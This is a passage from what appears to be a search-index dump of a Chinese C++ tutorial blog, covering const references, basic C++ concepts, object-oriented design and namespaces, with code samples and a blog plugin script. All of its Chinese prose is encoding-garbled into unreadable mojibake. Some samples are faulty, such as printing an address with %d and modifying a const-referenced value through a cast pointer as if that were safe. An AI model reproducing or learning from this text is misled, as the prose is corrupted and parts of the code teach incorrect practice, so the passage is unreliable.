printTe2(&amp;t1); return 0;} ä½¿ç”¨å­—é¢é‡å¸¸é‡åˆå§‹åŒ– const å¼•ç”¨1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { const int b = 10; printf("b:%d\\n", &amp;b); // int &amp;a = 19; è‹¥ä¸åŠ constå…³é”®å­—ï¼Œåˆ™ç¼–è¯‘å¤±è´¥ const int &amp;a = 19; printf("&amp;a:%d \\n", &amp;a); return 0;} const å¼•ç”¨ç»¼åˆä½¿ç”¨ç¤ºä¾‹12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;int main() { // æ™®é€šå¼•ç”¨ int a = 10; int &amp;b = a; // å¸¸é‡å¼•ç”¨ï¼Œè®©å˜é‡æ‹¥æœ‰åªè¯»å±æ€§ const int &amp;c = a; // å¸¸é‡å¼•ç”¨çš„åˆå§‹åŒ–åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§ // 1.ç”¨å˜é‡åˆå§‹åŒ–å¸¸é‡å¼•ç”¨ { int x = 20; const int &amp;y = x; printf("y:%d \\n", y); } // 2.ç”¨å­—é¢é‡å¸¸é‡åˆå§‹åŒ–å¸¸é‡å¼•ç”¨ { // int &amp;m = 10; // é”™è¯¯å†™æ³•ï¼Œå¼•ç”¨æ˜¯å†…å­˜ç©ºé—´çš„åˆ«åï¼Œå­—é¢é‡10æ²¡æœ‰å†…å­˜ç©ºé—´ï¼Œæ²¡æœ‰æ–¹æ³•åšå¼•ç”¨ const int &amp;m = 10; } return 0;} const å¼•ç”¨æ€»ç»“ æ™®é€šå¼•ç”¨ int &amp;e = a; ç›¸å½“äº int * const e = &amp;a; å¸¸å¼•ç”¨ const int &amp; e; ç›¸å½“äº const int * const e; å½“ä½¿ç”¨å­—é¢é‡å¸¸é‡å¯¹ const å¼•ç”¨è¿›è¡Œåˆå§‹åŒ–æ—¶ï¼ˆå¦‚ const int &amp;m = 10;ï¼‰ï¼ŒC++ ç¼–è¯‘å™¨ä¼šä¸ºå¸¸é‡å€¼å•ç‹¬åˆ†é…å†…å­˜ç©ºé—´ï¼Œå¹¶å°†å¼•ç”¨åä½œä¸ºè¿™æ®µå†…å­˜ç©ºé—´çš„åˆ«å ä½¿ç”¨å­—é¢é‡å¸¸é‡å¯¹ const å¼•ç”¨åˆå§‹åŒ–åï¼ˆå¦‚ const int &amp;m = 10;ï¼‰ï¼Œå°†ç”Ÿæˆä¸€ä¸ªåªè¯»å˜é‡ï¼Œä½†å¯ä»¥ä½¿ç”¨æŒ‡é’ˆçš„æ–¹å¼æ›´æ”¹å˜é‡çš„å€¼ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011#include &lt;iostream&gt;using namespace std;int main() { const int &amp;a = 100; int *p = (int *) &amp;a; *p = 30; cout &lt;&lt; *p &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123030 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹ä¸€",url:"/posts/8bbc3f09.html",text:'C++ ç®€ä»‹ç®€ä»‹ï¼š C++ è¢«è®¤ä¸ºæ˜¯ä¸€ç§ä¸­çº§è¯­è¨€ï¼Œå®ƒç»¼åˆäº†é«˜çº§è¯­è¨€å’Œä½çº§è¯­è¨€çš„ç‰¹ç‚¹ã€‚ C++ æ˜¯ C çš„ä¸€ä¸ªè¶…é›†ï¼Œäº‹å®ä¸Šï¼Œä»»ä½•åˆæ³•çš„ C ç¨‹åºéƒ½æ˜¯åˆæ³•çš„ C++ ç¨‹åºã€‚ C++ æ˜¯ä¸€ç§é™æ€ç±»å‹çš„ã€ç¼–è¯‘å¼çš„ã€é€šç”¨çš„ã€å¤§å°å†™æ•æ„Ÿçš„ã€ä¸è§„åˆ™çš„ç¼–ç¨‹è¯­è¨€ï¼Œæ”¯æŒè¿‡ç¨‹åŒ–ç¼–ç¨‹ã€é¢å‘å¯¹è±¡ç¼–ç¨‹å’Œæ³›å‹ç¼–ç¨‹ã€‚ C++ æ˜¯ç”± Bjarne Stroustrup äº 1979 å¹´åœ¨æ–°æ³½è¥¿å·ç¾åˆ©å±±è´å°”å®éªŒå®¤å¼€å§‹è®¾è®¡å¼€å‘çš„ã€‚C++ è¿›ä¸€æ­¥æ‰©å……å’Œå®Œå–„äº† C è¯­è¨€ï¼Œæœ€åˆå‘½åä¸ºå¸¦ç±»çš„ Cï¼Œåæ¥åœ¨ 1983 å¹´æ›´åä¸º C++ã€‚ æ³¨æ„ï¼šä½¿ç”¨é™æ€ç±»å‹çš„ç¼–ç¨‹è¯­è¨€æ˜¯åœ¨ç¼–è¯‘æ—¶æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œè€Œä¸æ˜¯åœ¨è¿è¡Œæ—¶æ‰§è¡Œç±»å‹æ£€æŸ¥ã€‚ ANSI æ ‡å‡†ï¼š ANSI æ ‡å‡†æ˜¯ä¸ºäº†ç¡®ä¿ C++ çš„ä¾¿æºæ€§ â€”â€” æ‚¨æ‰€ç¼–å†™çš„ä»£ç åœ¨ Macã€UNIXã€Windowsã€Alpha è®¡ç®—æœºä¸Šéƒ½èƒ½é€šè¿‡ç¼–è¯‘ã€‚ç”±äº ANSI æ ‡å‡†å·²ç¨³å®šä½¿ç”¨äº†å¾ˆé•¿çš„æ—¶é—´ï¼Œæ‰€æœ‰ä¸»è¦çš„ C++ ç¼–è¯‘å™¨çš„åˆ¶é€ å•†éƒ½æ”¯æŒ ANSI æ ‡å‡†ã€‚ æ ‡å‡† C++ çš„ä¸‰å¤§ç»„æˆéƒ¨åˆ†ï¼š æ ¸å¿ƒè¯­è¨€ï¼Œæä¾›äº†æ‰€æœ‰æ„ä»¶å—ï¼ŒåŒ…æ‹¬å˜é‡ã€æ•°æ®ç±»å‹å’Œå¸¸é‡ç­‰ã€‚ C++ æ ‡å‡†åº“ï¼Œæä¾›äº†å¤§é‡çš„å‡½æ•°ï¼Œç”¨äºæ“ä½œæ–‡ä»¶ã€å­—ç¬¦ä¸²ç­‰ã€‚ æ ‡å‡†æ¨¡æ¿åº“ï¼ˆSTLï¼‰ï¼Œæä¾›äº†å¤§é‡çš„æ–¹æ³•ï¼Œç”¨äºæ“ä½œæ•°æ®ç»“æ„ç­‰ã€‚ ç¬¬ä¸€ä¸ª C++ ç¨‹åº12345678910111213// åŒ…å«C++çš„å¤´æ–‡ä»¶#include &lt;iostream&gt;// ä½¿ç”¨å‘½åç©ºé—´ stdï¼ˆæ ‡å‡†çš„å‘½åç©ºé—´ï¼‰ï¼Œåœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­å®šä¹‰äº†å¾ˆå¤š C++ çš„æ ‡å‡†å®šä¹‰using namespace std;int main() { // cout: æ ‡å‡†è¾“å‡º // endl: æ¢è¡Œç¬¦å·ï¼Œç±»ä¼¼ "\\n" // &lt;&lt; å·¦ç§»æ“ä½œç¬¦: åœ¨C++é‡Œé¢ï¼Œå±äºåŠŸèƒ½çš„æ”¹é€ ï¼ˆå¢å¼ºï¼‰ï¼Œå³ C++ è¯­è¨€çš„æ“ä½œç¬¦é‡è½½ cout &lt;&lt; "hello world" &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1hello world å…³äº endl ä¸ \\n çš„åŒºåˆ«ï¼š åœ¨ C++ ä¸­ï¼Œç»ˆç«¯è¾“å‡ºæ¢è¡Œæ—¶ï¼Œç”¨ cout &lt;&lt; ... &lt;&lt; endl ä¸ \\n éƒ½å¯ä»¥ï¼Œä½†äºŒè€…æœ‰å°å°çš„åŒºåˆ«ï¼Œç”¨ endl æ—¶ä¼šåˆ·æ–°ç¼“å†²åŒºï¼Œä½¿å¾—æ ˆä¸­çš„ä¸œè¥¿åˆ·æ–°ä¸€æ¬¡ï¼›ä½†ç”¨ \\n åˆ™ä¸ä¼šåˆ·æ–°ï¼Œå®ƒåªä¼šæ¢è¡Œï¼Œæ ˆå†…çš„æ•°æ®æ²¡æœ‰å˜åŒ–ã€‚ä¸€èˆ¬æƒ…å†µï¼ŒäºŒè€…çš„è¿™ç‚¹åŒºåˆ«æ˜¯å¾ˆå°çš„ï¼Œåœ¨å¤§å‹çš„ç¨‹åºä¸­å¯èƒ½ä¼šç”¨åˆ°ï¼Œå»ºè®®ç”¨ endl æ¥æ¢è¡Œã€‚ endl é™¤äº†å†™å…¥ \\n ä¹‹å¤–ï¼Œè¿˜ä¼šè°ƒç”¨ flush å‡½æ•°æ¥åˆ·æ–°ç¼“å†²åŒºï¼Œå°†ç¼“å†²åŒºé‡Œçš„æ•°æ®å†™å…¥æ–‡ä»¶æˆ–å±å¹•ï¼Œè‹¥è€ƒè™‘æ•ˆç‡åˆ™å¯ä»¥ç›´æ¥ä½¿ç”¨ \\n cout &lt;&lt; endl; ç­‰ä»·äº cout &lt;&lt; \'\\n\' &lt;&lt; flush; ç¨‹åºè®¾è®¡æ–¹æ³•ä»‹ç»é¢å‘è¿‡ç¨‹çš„ç¨‹åºè®¾è®¡æ–¹æ³•è®¾è®¡æ€è·¯ é¢å‘è¿‡ç¨‹çš„ç»“æ„åŒ–ç¨‹åºè®¾è®¡æ–¹æ³•ï¼Œè‡ªé¡¶å‘ä¸‹ã€é€æ­¥æ±‚ç²¾ã€‚é‡‡ç”¨æ¨¡å—åˆ†è§£ä¸åŠŸèƒ½æŠ½è±¡ï¼Œè‡ªé¡¶å‘ä¸‹ã€åˆ†è€Œæ²»ä¹‹ã€‚ ç¨‹åºç»“æ„ æŒ‰åŠŸèƒ½åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªåŸºæœ¬æ¨¡å—ï¼Œå½¢æˆä¸€ä¸ªæ ‘çŠ¶ç»“æ„ã€‚ å„æ¨¡å—é—´çš„å…³ç³»å°½å¯èƒ½ç®€å•ï¼ŒåŠŸèƒ½ä¸Šç›¸å¯¹ç‹¬ç«‹ï¼›æ¯ä¸€æ¨¡å—å†…éƒ¨å‡æ˜¯ç”±é¡ºåºã€é€‰æ‹©å’Œå¾ªç¯ä¸‰ç§åŸºæœ¬ç»“æ„ç»„æˆã€‚ å…¶æ¨¡å—åŒ–å®ç°çš„å…·ä½“æ–¹æ³•æ˜¯ä½¿ç”¨å­ç¨‹åºã€‚ ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹: æœ‰æ•ˆåœ°å°†ä¸€ä¸ªè¾ƒå¤æ‚çš„ç¨‹åºç³»ç»Ÿè®¾è®¡ä»»åŠ¡åˆ†è§£æˆè®¸å¤šæ˜“äºæ§åˆ¶å’Œå¤„ç†çš„å­ä»»åŠ¡ï¼Œä¾¿äºå¼€å‘å’Œç»´æŠ¤ã€‚ ç¼ºç‚¹: å¯é‡ç”¨æ€§å·®ã€æ•°æ®å®‰å…¨æ€§å·®ã€éš¾ä»¥å¼€å‘å¤§å‹è½¯ä»¶å’Œå›¾å½¢ç•Œé¢çš„åº”ç”¨è½¯ä»¶ æŠŠæ•°æ®å’Œå¤„ç†æ•°æ®çš„è¿‡ç¨‹åˆ†ç¦»ä¸ºç›¸äº’ç‹¬ç«‹çš„å®ä½“ã€‚ å½“æ•°æ®ç»“æ„æ”¹å˜æ—¶ï¼Œæ‰€æœ‰ç›¸å…³çš„å¤„ç†è¿‡ç¨‹éƒ½è¦è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ã€‚ æ¯ä¸€ç§ç›¸å¯¹äºè€é—®é¢˜çš„æ–°æ–¹æ³•éƒ½è¦å¸¦æ¥é¢å¤–çš„å¼€é”€ã€‚ å›¾å½¢ç”¨æˆ·ç•Œé¢çš„åº”ç”¨ç¨‹åºï¼Œå¾ˆéš¾ç”¨è¿‡ç¨‹æ¥æè¿°å’Œå®ç°ï¼Œå¼€å‘å’Œç»´æŠ¤ä¹Ÿéƒ½å¾ˆå›°éš¾ã€‚ é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡æ–¹æ³•C++ å®Œå…¨æ”¯æŒé¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡ï¼ŒåŒ…æ‹¬é¢å‘å¯¹è±¡å¼€å‘çš„å››å¤§ç‰¹æ€§ï¼š å°è£…ã€æŠ½è±¡ã€ç»§æ‰¿ã€å¤šæ€ï¼Œæ›´å¤šç‰¹æ€§å¦‚ä¸‹ï¼š å°†æ•°æ®åŠå¯¹æ•°æ®çš„æ“ä½œæ–¹æ³•å°è£…åœ¨ä¸€èµ·ï¼Œä½œä¸ºä¸€ä¸ªç›¸äº’ä¾å­˜ã€ä¸å¯åˆ†ç¦»çš„æ•´ä½“ï¼ˆå¯¹è±¡ï¼‰ã€‚ å¯¹åŒç±»å‹å¯¹è±¡æŠ½è±¡å‡ºå…¶å…±æ€§ï¼Œå½¢æˆç±»ã€‚ ç±»é€šè¿‡ä¸€ä¸ªç®€å•çš„å¤–éƒ¨æ¥å£ï¼Œä¸å¤–ç•Œå‘ç”Ÿå…³ç³»ã€‚ å¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´é€šè¿‡æ¶ˆæ¯è¿›è¡Œé€šä¿¡ã€‚ é¢å‘å¯¹è±¡çš„è½¯ä»¶å·¥ç¨‹æ¦‚è¿°é¢å‘å¯¹è±¡çš„è½¯ä»¶å·¥ç¨‹æ˜¯é¢å‘å¯¹è±¡æ–¹æ³•åœ¨è½¯ä»¶å·¥ç¨‹é¢†åŸŸçš„å…¨é¢åº”ç”¨ï¼Œåˆ†åˆ«åŒ…æ‹¬: é¢å‘å¯¹è±¡çš„åˆ†æï¼ˆOOAï¼‰ é¢å‘å¯¹è±¡çš„è®¾è®¡ï¼ˆOODï¼‰ é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ï¼ˆOOPï¼‰ é¢å‘å¯¹è±¡çš„æµ‹è¯•ï¼ˆOOTï¼‰ é¢å‘å¯¹è±¡çš„è½¯ä»¶ç»´æŠ¤ï¼ˆOOSMï¼‰ é¢å‘è¿‡ç¨‹ç¨‹åºè®¾è®¡ï¼šæ•°æ®ç»“æ„ + ç®—æ³•ï¼Œä¸»è¦ç”¨äºè§£å†³ç§‘å­¦è®¡ç®—é—®é¢˜ï¼Œç”¨æˆ·éœ€æ±‚ç®€å•è€Œå›ºå®šï¼Œå…¶ç‰¹ç‚¹å’ŒåŠ£åŠ¿å¦‚ä¸‹ï¼š ç‰¹ç‚¹ï¼š åˆ†æè§£å†³é—®é¢˜æ‰€éœ€è¦çš„æ­¥éª¤ åˆ©ç”¨å‡½æ•°å®ç°å„ä¸ªæ­¥éª¤ ä¾æ¬¡è°ƒç”¨å‡½æ•°è§£å†³é—®é¢˜ åŠ£åŠ¿ï¼š è½¯ä»¶å¯é‡ç”¨æ€§å·® è½¯ä»¶å¯ç»´æŠ¤æ€§å·® æ„å»ºçš„è½¯ä»¶æ— æ³•æ»¡è¶³ç”¨æˆ·éœ€æ±‚ é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼šç”±ç°å®ä¸–ç•Œå»ºç«‹è½¯ä»¶æ¨¡å‹ï¼Œå°†ç°å®ä¸–ç•Œä¸­çš„äº‹ç‰©ç›´æ¥æ˜ å°„åˆ°ç¨‹åºä¸­ï¼Œå¯ç›´æ¥æ»¡è¶³ç”¨æˆ·éœ€æ±‚ï¼Œå…¶ç‰¹ç‚¹å’Œä¼˜åŠ¿å¦‚ä¸‹ï¼š ç‰¹ç‚¹ï¼š ç›´æ¥åˆ†æç”¨æˆ·éœ€æ±‚ä¸­æ¶‰åŠçš„å„ä¸ªå®ä½“ åœ¨ä»£ç ä¸­æè¿°ç°å®ä¸–ç•Œä¸­çš„å®ä½“ åœ¨ä»£ç ä¸­å…³è”å„ä¸ªå®ä½“ååŒå·¥ä½œè§£å†³é—®é¢˜ ä¼˜åŠ¿ï¼š æ„å»ºçš„è½¯ä»¶èƒ½å¤Ÿé€‚åº”ç”¨æˆ·éœ€æ±‚çš„ä¸æ–­å˜åŒ– ç›´æ¥åˆ©ç”¨é¢å‘è¿‡ç¨‹æ–¹æ³•çš„ä¼˜åŠ¿è€Œé¿å¼€å…¶åŠ£åŠ¿ è®¡ç®—åœ†å½¢çš„é¢ç§¯é¢å‘è¿‡ç¨‹çš„å†™æ³•1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { double r = 0; // åœ†å½¢çš„åŠå¾„ double s = 0; // åœ†å½¢çš„é¢ç§¯ cout &lt;&lt; "è¯·è¾“å…¥åœ†å½¢çš„åŠå¾„ï¼š"; cin &gt;&gt; r; s = 3.14 * r * r; cout &lt;&lt; "åœ†å½¢çš„é¢ç§¯æ˜¯ï¼š" &lt;&lt; s &lt;&lt; endl; return 0;} é¢å‘å¯¹è±¡çš„å†™æ³•123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {public: double m_r; // åœ†å½¢çš„åŠå¾„ double m_s; // åœ†å½¢çš„é¢ç§¯public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "è¯·è¾“å…¥åœ†å½¢çš„åŠå¾„ï¼š"; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "åœ†å½¢çš„é¢ç§¯æ˜¯ï¼š" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} C++ åŸºç¡€æ¦‚å¿µå‘½åç©ºé—´æ‰€è°“ namespaceï¼Œæ˜¯æŒ‡æ ‡è¯†ç¬¦çš„å„ç§å¯è§èŒƒå›´ã€‚C++ æ ‡å‡†ç¨‹åºåº“ä¸­çš„æ‰€æœ‰æ ‡è¯†ç¬¦éƒ½è¢«å®šä¹‰äºä¸€ä¸ªåä¸º std çš„ namespace ä¸­ã€‚&lt;iostream&gt; å’Œ &lt;iostream.h&gt; æ ¼å¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œå‰è€…æ²¡æœ‰åç¼€ï¼Œå®é™…ä¸Šåœ¨ç¼–è¯‘å™¨ include æ–‡ä»¶å¤¹é‡Œé¢å¯ä»¥çœ‹åˆ°ï¼ŒäºŒè€…æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶å°±ä¼šå‘ç°ï¼Œé‡Œé¢çš„ä»£ç æ˜¯ä¸ä¸€æ ·çš„ã€‚åç¼€ä¸º .h çš„å¤´æ–‡ä»¶ C++ æ ‡å‡†å·²ç»æ˜ç¡®æå‡ºä¸å†æ”¯æŒäº†ï¼Œæ—©äº›çš„å®ç°å°†æ ‡å‡†åº“åŠŸèƒ½å®šä¹‰åœ¨å…¨å±€å‘½åç©ºé—´é‡Œï¼Œå³å£°æ˜åœ¨å¸¦ .h åç¼€çš„å¤´æ–‡ä»¶é‡Œï¼›C++ æ ‡å‡†ä¸ºäº†å’Œ C åŒºåˆ«å¼€ï¼Œä¹Ÿä¸ºäº†æ­£ç¡®ä½¿ç”¨å‘½åç©ºé—´ï¼Œè§„å®šå¤´æ–‡ä»¶ä¸å†ä½¿ç”¨åç¼€ .hã€‚ &lt;iostream.h&gt; ä¸ &lt;iostream&gt; çš„åŒºåˆ«ï¼š å½“ä½¿ç”¨ &lt;iostream.h&gt; æ—¶ï¼Œç›¸å½“äºåœ¨ C ä¸­è°ƒç”¨åº“å‡½æ•°ï¼Œä½¿ç”¨çš„æ˜¯å…¨å±€å‘½åç©ºé—´ï¼Œä¹Ÿå°±æ˜¯æ—©æœŸçš„ C++ å®ç° å½“ä½¿ç”¨ &lt;iostream&gt; çš„æ—¶å€™ï¼Œè¯¥å¤´æ–‡ä»¶æ²¡æœ‰å®šä¹‰åœ¨å…¨å±€å‘½åç©ºé—´ï¼Œå¿…é¡»ä½¿ç”¨ using namespace std; è¿™æ ·æ‰èƒ½æ­£ç¡®ä½¿ç”¨ cout ç­‰å…³é”®å­— ç”±äº namespace çš„æ¦‚å¿µï¼Œä½¿ç”¨ C++ æ ‡å‡†ç¨‹åºåº“çš„ä»»ä½•æ ‡è¯†ç¬¦æ—¶ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹ä¸‰ç§å†™æ³•å¯é€‰æ‹©ï¼š ç›´æ¥æŒ‡å®šæ ‡è¯†ç¬¦ï¼šä¾‹å¦‚ std::ostream è€Œä¸æ˜¯ ostreamï¼Œå®Œæ•´è¯­å¥ä¸ºï¼š std::cout &lt;&lt; std::hex &lt;&lt; 3.4 &lt;&lt; std::endl; ä½¿ç”¨ using å…³é”®å­—ï¼šusing std::cout; using std::endl; using std::cin;ï¼Œä»¥ä¸Šè¯­å¥å¯ä»¥å†™æˆ cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl; ä½¿ç”¨ using namespace stdï¼šè¿™ç§å†™æ³•æ˜¯æœ€æ–¹ä¾¿çš„ï¼Œä¾‹å¦‚ï¼š using namespace std;ï¼Œä»¥ä¸Šè¯­å¥å¯ä»¥å†™æˆ cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl; å‘½åç©ºé—´ std å†…å®šä¹‰çš„æ‰€æœ‰æ ‡è¯†ç¬¦éƒ½æœ‰æ•ˆï¼ˆæ›å…‰ï¼‰ï¼Œå°±å¥½åƒå®ƒä»¬è¢«å£°æ˜ä¸ºå…¨å±€å˜é‡ä¸€æ ·ï¼Œé‚£ä¹ˆä»¥ä¸Šè¯­å¥å°±å¯ä»¥è¿™æ ·å†™ cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl;ã€‚å› ä¸ºæ ‡å‡†åº“éå¸¸çš„åºå¤§ï¼Œæ‰€ä»¥ç¨‹åºå‘˜åœ¨é€‰æ‹©çš„ç±»çš„åç§°æˆ–å‡½æ•°åæ—¶å°±å¾ˆæœ‰å¯èƒ½å’Œæ ‡å‡†åº“ä¸­çš„æŸä¸ªåå­—ç›¸åŒã€‚å› æ­¤ä¸ºäº†é¿å…è¿™ç§æƒ…å†µæ‰€é€ æˆçš„åå­—å†²çªï¼Œå°±æŠŠæ ‡å‡†åº“ä¸­çš„ä¸€åˆ‡éƒ½è¢«æ”¾åœ¨åå­—ç©ºé—´ std ä¸­ã€‚ä½†è¿™åˆä¼šå¸¦æ¥äº†ä¸€ä¸ªæ–°é—®é¢˜ï¼Œæ— æ•°åŸæœ‰çš„ C++ ä»£ç éƒ½ä¾èµ–äºä½¿ç”¨äº†å¤šå¹´çš„ä¼ªæ ‡å‡†åº“ä¸­çš„åŠŸèƒ½ï¼Œå®ƒä»¬éƒ½æ˜¯åœ¨å…¨å±€å‘½åç©ºé—´ä¸‹çš„ã€‚æ‰€ä»¥å°±æœ‰äº† &lt;iostream.h&gt; å’Œ &lt;iostream&gt; ç­‰ç­‰è¿™æ ·çš„å¤´æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ä¸ºäº†å…¼å®¹ä»¥å‰çš„ C++ ä»£ç ï¼Œå¦ä¸€ä¸ªæ˜¯ä¸ºäº†æ”¯æŒæ–°çš„æ ‡å‡†ã€‚å‘½åç©ºé—´ std å°è£…çš„æ˜¯æ ‡å‡†ç¨‹åºåº“çš„åç§°ï¼Œæ ‡å‡†ç¨‹åºåº“ä¸ºäº†å’Œä»¥å‰çš„å¤´æ–‡ä»¶åŒºåˆ«ï¼Œä¸€èˆ¬ä¸åŠ åç¼€ .hã€‚ å‘½åç©ºé—´å®šä¹‰åŠä½¿ç”¨è¯­æ³•åœ¨ C++ ä¸­ï¼Œåç§°ï¼ˆnameï¼‰å¯ä»¥æ˜¯ç¬¦å·å¸¸é‡ã€å˜é‡ã€å®ã€å‡½æ•°ã€ç»“æ„ã€æšä¸¾ã€ç±»å’Œå¯¹è±¡ç­‰ç­‰ã€‚ä¸ºäº†é¿å…åœ¨å¤§è§„æ¨¡ç¨‹åºçš„è®¾è®¡ä¸­ï¼Œä»¥åŠåœ¨ç¨‹åºå‘˜ä½¿ç”¨å„ç§å„æ ·çš„ C++ åº“æ—¶ï¼Œè¿™äº›æ ‡è¯†ç¬¦çš„å‘½åå‘ç”Ÿå†²çªï¼Œæ ‡å‡† C++ å¼•å…¥äº†å…³é”®å­— namespaceï¼ˆå‘½åç©ºé—´ / åå­—ç©ºé—´ / åç§°ç©ºé—´ / ååŸŸï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥æ›´å¥½åœ°æ§åˆ¶æ ‡è¯†ç¬¦çš„ä½œç”¨åŸŸã€‚std æ˜¯ C++ æ ‡å‡†å‘½åç©ºé—´ï¼ŒC++ æ ‡å‡†ç¨‹åºåº“ä¸­çš„æ‰€æœ‰æ ‡è¯†ç¬¦éƒ½è¢«å®šä¹‰åœ¨ std ä¸­ï¼Œæ¯”å¦‚æ ‡å‡†åº“ä¸­çš„ç±» iostreamã€vector ç­‰éƒ½å®šä¹‰åœ¨è¯¥å‘½åç©ºé—´ä¸­ï¼Œä½¿ç”¨æ—¶è¦åŠ ä¸Š using å£°æ˜ï¼ˆå¦‚ using namespace std) æˆ–è€… using æŒ‡ç¤ºï¼ˆå¦‚ std::stringã€std::vector&lt;int&gt;ï¼‰ã€‚ C è¯­è¨€ä¸­çš„å‘½åç©ºé—´ï¼š æ ‡è¯†ç¬¦ä¹‹é—´å¯èƒ½å‘ç”Ÿå†²çª åœ¨ C è¯­è¨€ä¸­åªæœ‰ä¸€ä¸ªå…¨å±€ä½œç”¨åŸŸ C è¯­è¨€ä¸­æ‰€æœ‰çš„å…¨å±€æ ‡è¯†ç¬¦å…±äº«åŒä¸€ä¸ªä½œç”¨åŸŸ C++ ä¸­çš„å‘½åç©ºé—´ï¼š å‘½åç©ºé—´å¯ä»¥ç›¸äº’åµŒå¥—å®šä¹‰ å…¨å±€ä½œç”¨åŸŸä¹Ÿå«é»˜è®¤å‘½åç©ºé—´ å‘½åç©ºé—´å°†å…¨å±€ä½œç”¨åŸŸåˆ†æˆä¸åŒçš„éƒ¨åˆ† ä¸åŒå‘½åç©ºé—´ä¸­çš„æ ‡è¯†ç¬¦å¯ä»¥åŒåè€Œä¸ä¼šå‘ç”Ÿå†²çª C++ å‘½åç©ºé—´å®šä¹‰åŠä½¿ç”¨è¯­æ³•ï¼š å‘½åç©ºé—´å®šä¹‰çš„è¯­æ³•ï¼šnamespace name { â€¦ } å‘½åç©ºé—´ä½¿ç”¨çš„è¯­æ³•ï¼šusing namespace name; ä½¿ç”¨ç‰¹å®šå‘½åç©ºé—´ä¸­çš„å˜é‡ï¼šusing name::variable; ä½¿ç”¨é»˜è®¤å‘½åç©ºé—´ä¸­çš„å˜é‡ï¼š::variable é»˜è®¤æƒ…å†µä¸‹å¯ä»¥ç›´æ¥ä½¿ç”¨é»˜è®¤å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰æ ‡è¯†ç¬¦ å‘½åç©ºé—´ç¼–ç¨‹å®æˆ˜1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;// å®šä¹‰å‘½åç©ºé—´ NameSpaceAnamespace NameSpaceA { int a = 0;}// å®šä¹‰å‘½åç©ºé—´ NameSpaceBnamespace NameSpaceB { int a = 1; // åµŒå¥—å®šä¹‰å‘½åç©ºé—´ NameSpaceC namespace NameSpaceC { struct Teacher { char name[10]; int age; }; }}int main() { // å£°æ˜ std å‘½åç©ºé—´åçš„å†™æ³• cout &lt;&lt; "hello world" &lt;&lt; endl; // ä¸å£°æ˜ std å‘½åç©ºé—´åçš„å†™æ³• std::cout &lt;&lt; "hello world" &lt;&lt; std::endl; // å£°æ˜ NameSpaceA å‘½åç©ºé—´ using namespace NameSpaceA; // ä½¿ç”¨ NameSpaceC å‘½åç©ºé—´ä¸­çš„å˜é‡ using NameSpaceB::NameSpaceC::Teacher; printf("a = %d\\n", a); printf("a = %d\\n", NameSpaceB::a); Teacher teacher = {"Jim", 20}; printf("teacher.age = %d\\n", teacher.age); printf("teacher.name = %s\\n", teacher.name); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123456hello worldhello worlda = 0a = 1teacher.age = 20teacher.name = Jim C è¯­è¨€å’Œ C++ çš„å…³ç³»C è¯­è¨€æ˜¯åœ¨å®è·µçš„è¿‡ç¨‹ä¸­é€æ­¥å®Œå–„èµ·æ¥çš„ï¼Œæ²¡æœ‰æ·±æ€ç†Ÿè™‘çš„è®¾è®¡è¿‡ç¨‹ï¼Œä½¿ç”¨æ—¶å­˜åœ¨å¾ˆå¤š ç°è‰²åœ°å¸¦ï¼Œæ®‹ç•™äº†è¿‡å¤šä½çº§è¯­è¨€çš„ç‰¹å¾ï¼Œç›´æ¥åˆ©ç”¨æŒ‡é’ˆè¿›è¡Œå†…å­˜æ“ä½œï¼Œå…¶æœ€ç»ˆç›®æ 